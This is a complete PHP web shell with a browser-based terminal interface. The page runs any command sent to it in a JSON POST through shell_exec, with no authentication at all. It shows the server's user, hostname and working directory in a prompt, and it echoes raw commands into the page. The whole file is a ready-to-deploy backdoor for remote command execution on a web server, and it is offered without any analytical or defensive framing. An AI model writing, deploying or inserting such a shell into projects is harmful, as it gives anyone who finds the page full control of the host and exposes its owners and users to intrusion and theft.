<?php

function escapetext($text) {
    return str_replace("\n", "<br>", htmlentities($text));
}

function exec_command($cmd, $internal = false) {
    try {
        $shell_exec = shell_exec($cmd);
    } catch (Exception $e) {
        if ($internal === true) {
            return $e->getMessage();
        } else {
            return json_encode([
                'status' => 'error',
                'response' => $e->getMessage()
            ]);
        }
    }

    if ($internal === true) {
        return $shell_exec;
    } else {
        return json_encode([
            'status' => 'ok',
            'response' => escapetext($shell_exec)
        ]);
    }
}

$postdata = json_decode(file_get_contents('php://input'));

if (!is_null($postdata) && isset($postdata->cmd)) {
    die(exec_command($postdata->cmd));
}

try {
    $hostvars = exec_command('whoami && hostname && pwd', true);

    list($whoami, $hostname, $pwd) = explode("\n", $hostvars);

    if (!$whoami) {
        throw new Exception('Could not execute `whoami`');
    }

    if (!$hostname) {
        throw new Exception('Could not execute `hostname`');
    }

    if (!$pwd) {
        throw new Exception('Could not execute `pwd`');
    }
} catch (Exception $e) {
    $errormsg = $e->getMessage();
}

?>
<!doctype html>
<html>
<head>
    <title>PHP Interactive Shell - <?php echo isset($errormsg) ? 'Inactive' : 'Active'; ?></title>
    <style>
    body {
        background: #000;
        color: #fff;
        font-family: monospace;
    }

    #terminal {
        position: fixed;
        left: 0;
        bottom: 2em;
        padding: 1em;
        width: calc(100% - 2em);
        max-height: calc(100% - 4em);
        margin: 0 auto;
        overflow-y: auto;
        overflow-x: hidden;
        white-space: pre-wrap;
        word-break: break-all;
    }

    #bottombar {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
    }

    #ps1 {
        padding-left: 1em;
        line-height: 2em;
        height: 2em;
        float: left;
        max-width: 40%;
        padding-right: .5em;
    }

    #cursor {
        height: calc(2em - 1px);
        padding: 0;
        border: 0;
        float: left;
        min-width: 60%;
        max-width: 80%;
        background: #000;
        color: #fff;
        font-family: monospace;
        outline: none;
    }
    </style>
</head>
<body>
    <?php if (isset($errormsg)) {
        echo '<span>'.$errormsg.'</span>';
    } ?>

    <pre id="terminal"></pre>
    <div id="bottombar">
        <span id="ps1"></span>
        <input id="cursor" autofocus>
    </div>
    <script>
    class Terminal {
        constructor() {
            this.whoami = '<?php echo $whoami; ?>';
            this.hostname = '<?php echo $hostname; ?>';
            this.pwd = '<?php echo $pwd; ?>';
            this.PATH_SEP = '/';
            this.commandHistory = [];
            this.commandHistoryIndex = this.commandHistory.length;

            this.termWindow = document.getElementById('terminal');
            this.cursor = document.getElementById('cursor');
            this.ps1element = document.getElementById('ps1');

            this.ps1element.innerHTML = this.ps1();

            this.attachCursor();

            // this.execCommand('ifconfig');
        }

        formatPath(path) {
            path = path.replace(/\//g, this.PATH_SEP);
            let curPathArr = !path.match(/^(([A-Z]\:)|(\/))/) ? this.pwd.split(this.PATH_SEP) : [];
            let pathArr = curPathArr.concat(path.split(this.PATH_SEP).filter(el => el));
            let absPath = [];

            pathArr.forEach(el => {
                if (el === '.') {
                    // Do nothing
                } else if (el === '..') {
                    absPath.pop();
                } else {
                    absPath.push(el);
                }
            });

            return this.PATH_SEP + (absPath.length === 1 ? absPath[0] + this.PATH_SEP : absPath.join(this.PATH_SEP));
        }

        getCurrentPath() {
            return this.formatPath(this.pwd);
        }

        updateCurrentPath(newPath) {
            this.pwd = this.formatPath(newPath);
        }

        attachCursor() {
            this.cursor.addEventListener('keyup', ({keyCode}) => {
                switch (keyCode) {
                    case 13:
                        this.execCommand(this.cursor.value);
                        this.cursor.value = '';
                        this.ps1element.innerHTML = this.ps1();
                        this.commandHistoryIndex = this.commandHistory.length;
                        break;

                    case 38:
                        if (this.commandHistoryIndex !== 0) {
                            this.cursor.value = this.commandHistory[--this.commandHistoryIndex] || '';
                        }
                        break;

                    case 40:
                        if (this.commandHistoryIndex < this.commandHistory.length) {
                            this.cursor.value = this.commandHistory[++this.commandHistoryIndex] || '';
                        }
                        break;
                }
            });
        }

        ps1() {
            return `<span style="color:orange">${this.whoami}@${this.hostname}</span>:` +
                `<span style="color:limegreen">${this.getCurrentPath()}</span>$ `;
        }

        execCommand(cmd) {
            this.commandHistory.push(cmd);

            fetch(document.location.href, {
                method: 'POST',
                headers: new Headers({
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }),
                body: JSON.stringify({
                    cmd
                })
            }).then(
                res => res.json(),
                err => console.error(err)
            ).then(({response}) => {
                this.termWindow.innerHTML += `${this.ps1()}${cmd}<br>${response}`;

                this.termWindow.scrollTop = this.termWindow.scrollHeight;
            })
        }
    }

    window.addEventListener('load', () => {
        const terminal = new Terminal();
    });
    </script>
</body>
</html>
